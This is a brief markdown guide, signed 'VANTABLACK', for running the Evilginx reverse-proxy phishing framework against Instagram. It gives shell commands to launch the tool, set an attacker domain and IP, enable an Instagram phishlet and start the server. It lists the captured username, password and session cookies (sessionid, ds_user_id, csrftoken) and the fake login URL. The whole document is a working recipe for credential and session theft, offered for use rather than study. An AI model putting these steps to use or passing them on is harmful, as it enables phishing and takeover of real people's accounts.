# Evilginx Guide for Instagram

## Enable and Launch

```bash
./bin/evilginx -p ./phishlets

# In shell:
config domain your-domain.com
config ip YOUR_IP
phishlets enable instagram
landers create instagram
server
```

## Credentials Captured

| Field | Key |
|-------|-----|
| Username | `username` |
| Password | `enc_password` |

## Tokens Captured

- `sessionid` - Session ID
- `ds_user_id` - User ID
- `csrftoken` - CSRF token

## Login URL

```
https://your-domain.com/instagram/accounts/login/
```

Redirects from: www.instagram.com/accounts/login/

---

**VANTABLACK**
